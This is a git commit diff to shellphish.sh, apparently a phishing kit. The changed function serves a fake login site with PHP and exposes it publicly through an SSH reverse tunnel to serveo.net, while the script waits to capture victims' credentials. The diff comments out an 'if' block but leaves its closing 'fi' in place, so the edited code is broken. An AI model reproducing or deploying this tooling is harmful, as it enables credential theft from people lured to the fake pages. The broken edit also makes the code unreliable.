9465bcd98c8f0db022b8142318a03e743eebc312
serflash <44881861+serflash@users.noreply.github.com>
2020-05-14 15:50:50 +0300

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -302,12 +302,12 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, P
 
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd sites/$server && php -S localhost:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-if [[ -e sendlink ]]; then
-rm -rf sendlink
+#if [[ -e sendlink ]]; then
+#rm -rf sendlink
 fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
